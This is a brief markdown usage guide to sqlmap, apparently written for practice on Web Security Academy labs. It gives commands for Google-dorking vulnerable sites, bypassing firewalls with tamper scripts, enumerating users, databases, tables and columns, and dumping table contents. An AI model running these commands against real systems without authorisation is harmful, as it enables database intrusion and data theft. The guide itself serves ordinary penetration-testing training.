# SQLMAP Usage Guide

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities.

## Target Options

### Basic Target Specification
```bash
# Specify a URL to test
sqlmap -u "http://www.websitesi.com/test.php?id=1"

# Use Google dork to find vulnerable targets
sqlmap -g ".php?id="
```

> *Note: **Google Dork** refers to search queries that help find specific types of vulnerable websites.*

## Injection Options

### Database Management System Specification
```bash
# Specify the DBMS type if known
sqlmap -u "www.siteadi.com/testet.php?id=1" --dbms="MySql"
```

### Tamper Scripts
```bash
# Use tamper scripts to bypass Web Application Firewalls (WAF)
sqlmap -u "www.siteadi.com/testet.php?id=1" --tamper="between"
```

### Payload Prefix
```bash
# Add a prefix to all payload injections
sqlmap -u "www.siteadi.com/testet.php?ad=deneme" --prefix "')"
```

## Enumeration Options

### User Enumeration
```bash
# Enumerate database users
sqlmap -u "www.siteadi.com/testet.php?id=1" --users
```

### Database Enumeration
```bash
# List all databases
sqlmap -u "www.siteadi.com/testet.php?id=1" --dbs
```

### Table Enumeration
```bash
# List all tables
sqlmap -u "www.siteadi.com/testet.php?id=1" --tables

# List tables for a specific database
sqlmap -u "www.siteadi.com/testet.php?id=1" -D veritabaniadi --tables
```

### Column Enumeration
```bash
# List all columns
sqlmap -u "www.siteadi.com/testet.php?id=1" --columns

# List columns for a specific table
sqlmap -u "www.siteadi.com/testet.php?id=1" -D veritabaniAdi -T tabloAdi --columns
```

### Data Extraction
```bash
# Dump data from a specified table
sqlmap -u "www.siteadi.com/testet.php?id=1" -D veritabaniAdi -T tabloAdi --dump
```

## Examples

```bash
# Get help information
python sqlmap.py -h

# Check databases on a vulnerable website
python sqlmap.py -u "https://0a2400f704d6ef0180ed946c00c80098.web-security-academy.net/" --dbs

# Examine the 'public' database
python sqlmap.py -u "https://0a2400f704d6ef0180ed946c00c80098.web-security-academy.net/filter?category=Gifts" -D public

# List tables in the 'public' database
python sqlmap.py -u "https://0a2400f704d6ef0180ed946c00c80098.web-security-academy.net/filter?category=Gifts" --tables -D public

# Dump all data from the 'public' database
python sqlmap.py -u "https://0a2400f704d6ef0180ed946c00c80098.web-security-academy.net/filter?category=Gifts" --tables -D public --dump
```